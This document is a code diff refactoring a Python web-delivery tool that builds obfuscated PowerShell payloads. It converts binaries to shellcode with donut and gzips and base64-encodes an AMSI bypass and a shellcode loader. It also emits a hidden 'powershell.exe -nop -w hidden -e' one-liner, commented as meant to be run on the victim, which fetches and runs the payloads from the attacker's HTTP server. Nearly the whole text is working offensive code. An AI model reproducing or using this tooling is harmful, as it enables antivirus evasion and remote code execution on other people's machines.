@@ -6,7 +6,88 @@ import subprocess
 from io import BytesIO 
 import gzip
 import base64
+from pathlib import Path
 from http.server import HTTPServer, SimpleHTTPRequestHandler
+
+
+    
+def generateOneLiner(ip, port, scheme="http", amsiPath="payloadAmsi.ps1", shellcodeLoaderPath="payloadShellcode.ps1"):
+
+    oneLinerToExecPath = os.path.join(Path(__file__).parent, "oneLinerToExec.template")
+    oneLiner = open(oneLinerToExecPath, "rb").read()
+
+    # output the oneliner to run on the victime
+    script = oneLiner.replace(b"SCHEME", scheme.encode())
+    script = script.replace(b"IP_WEBSERV", ip.encode())
+    script = script.replace(b"PORT_WEBSERV", port.encode())
+    script = script.replace(b"PAYLOAD_AMSI", amsiPath.encode("utf-8"))
+    script = script.replace(b"PAYLOAD_SHELLCODE", shellcodeLoaderPath.encode("utf-8"))
+    script_utf16 = script.decode("utf-8").encode("utf_16_le")
+    base64_bytes = base64.b64encode(script_utf16)
+
+#     oneLiner = "powershell.exe -nop -e {}".format(base64_bytes.decode("utf-8"))
+    oneLiner = "powershell.exe -nop -w hidden -e {}".format(base64_bytes.decode("utf-8"))
+
+    return oneLiner
+
+
+def generatePayloads(binary, binaryArgs, rawShellCode):
+
+    if binary:
+        print('binary ', binary)
+        print('binaryArgs ', binaryArgs)
+        print('')
+
+        if os.name == 'nt':
+                donutBinary = os.path.join(Path(__file__).parent, '.\\ressources\\donut.exe')
+                shellcodePath = os.path.join(Path(__file__).parent, '.\\shellcode.b64')
+                args = (donutBinary, '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, binary)
+        else:   
+                donutBinary = os.path.join(Path(__file__).parent, './ressources/donut')
+                shellcodePath = os.path.join(Path(__file__).parent, './shellcode.b64')
+                args = (donutBinary, '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', shellcodePath, '-i', binary)
+        popen = subprocess.Popen(args, stdout=subprocess.PIPE)
+        popen.wait()
+        output = popen.stdout.read()
+        
+        print("[+] Generate shellcode of payload with donut")
+        print(output.decode("utf-8") )
+
+        shellcode = open(shellcodePath, "rb").read()
+        os.remove(shellcodePath)
+
+    elif rawShellCode:
+        print('rawShellCode ', rawShellCode)
+        print('')
+
+        shellcode = open(rawShellCode, "rb").read()
+        shellcode = base64.b64encode(shellcode)
+
+        print(len(shellcode))
+
+    AmsiBypassPath = os.path.join(Path(__file__).parent, "AmsiBypass.template")
+    amsiBypass = open(AmsiBypassPath, "rb").read()
+
+    ShellcodeLoaderPath = os.path.join(Path(__file__).parent, "ShellcodeLoader.template")
+    shellCodeLoader = open(ShellcodeLoaderPath, "rb").read()
+
+    # creat AMIS bypass payload
+    out = BytesIO()
+    with gzip.GzipFile(fileobj=out, mode="wb") as f:
+    	f.write(amsiBypass)
+    base64_bytes = base64.b64encode(out.getvalue())
+    amsiOneLiner = "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))".format(base64_bytes.decode("utf-8"))
+
+    # creat Shellcode loader payload
+    script = shellCodeLoader.replace(b"SHELL_CODE", shellcode)
+
+    out = BytesIO()
+    with gzip.GzipFile(fileobj=out, mode="w") as f:
+    	f.write(script)
+    base64_bytes = base64.b64encode(out.getvalue())
+    shellcodeLoaderOneliner = "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))".format(base64_bytes.decode("utf-8"))
+    
+    return amsiOneLiner, shellcodeLoaderOneliner
 
 
 def main(argv):
@@ -44,77 +125,22 @@ def main(argv):
     print('ip ', ip)
     print('port ', port)
 
-    if binary:
-        print('binary ', binary)
-        print('binaryArgs ', binaryArgs)
-        print('')
+    amsiOneLiner, shellcodeLoaderOneliner = generatePayloads(binary, binaryArgs, rawShellCode)
 
-        if os.name == 'nt':
-                args = ('.\\ressources\\donut.exe', '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', '.\\shellcode.b64', binary)
-        else:   
-                args = ('./ressources/donut', '-f', '2', '-m', 'go', '-p', binaryArgs, '-o', './shellcode.b64', '-i', binary)
-        popen = subprocess.Popen(args, stdout=subprocess.PIPE)
-        popen.wait()
-        output = popen.stdout.read()
-        
-        print("[+] Generate shellcode of payload with donut")
-        print(output.decode("utf-8") )
-
-        shellcode = open("shellcode.b64", "rb").read()
-
-    elif rawShellCode:
-        print('rawShellCode ', rawShellCode)
-        print('')
-
-        shellcode = open(rawShellCode, "rb").read()
-        shellcode = base64.b64encode(shellcode)
-
-        print(len(shellcode))
-
-
-    amsiBypass = open("AmsiBypass.template", "rb").read()
-    shellCodeLoader = open("ShellcodeLoader.template", "rb").read()
-    oneLiner = open("oneLinerToExec.template", "rb").read()
-
-    # creat AMIS bypass payload
-    out = BytesIO()
-    with gzip.GzipFile(fileobj=out, mode="wb") as f:
-    	f.write(amsiBypass)
-    base64_bytes = base64.b64encode(out.getvalue())
-    amsiOneLiner = "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))".format(base64_bytes.decode("utf-8"))
-
-    # creat Shellcode loader payload
-    script = shellCodeLoader.replace(b"SHELL_CODE", shellcode)
-
-    out = BytesIO()
-    with gzip.GzipFile(fileobj=out, mode="w") as f:
-    	f.write(script)
-    base64_bytes = base64.b64encode(out.getvalue())
-    shellcodeLoaderOneliner = "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(('{}')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))".format(base64_bytes.decode("utf-8"))
-    
-    f1 = open("./web/payloadAmsi.ps1", "w")
+    payloadAmsiPath = os.path.join(Path(__file__).parent, "./web/payloadAmsi.ps1")
+    f1 = open(payloadAmsiPath, "w")
     f1.write(amsiOneLiner)
     f1.close()
 
-    f2 = open("./web/payloadShellcode.ps1", "w")
+    payloadShellcodePath = os.path.join(Path(__file__).parent, "./web/payloadShellcode.ps1")
+    f2 = open(payloadShellcodePath, "w")
     f2.write(shellcodeLoaderOneliner)
     f2.close()
 
-    # output the oneliner to run on the victime
-    script = oneLiner.replace(b"IP_WEBSERV", ip.encode())
-    script = script.replace(b"PORT_WEBSERV", port.encode())
-    script = script.replace(b"PAYLOAD_AMSI", b"payloadAmsi.ps1")
-    script = script.replace(b"PAYLOAD_SHELLCODE", b"payloadShellcode.ps1")
-    script_utf16 = script.decode("utf-8").encode("utf_16_le")
-    base64_bytes = base64.b64encode(script_utf16)
+    oneliner = generateOneLiner(ip, port, scheme="http", amsiPath="payloadAmsi.ps1", shellcodeLoaderPath="payloadShellcode.ps1")
 
-#     oneLiner = "powershell.exe -nop -e {}".format(base64_bytes.decode("utf-8"))
-    oneLiner = "powershell.exe -nop -w hidden -e {}".format(base64_bytes.decode("utf-8"))
-
-    if binary:
-        os.remove("shellcode.b64")
-    print(oneLiner)
-
+    print(oneliner)
+    
     print("[+] Web delivery on web server {} : {}".format(ip, port))
     os.chdir("./web")
     httpd = HTTPServer(('0.0.0.0', int(port)), SimpleHTTPRequestHandler)
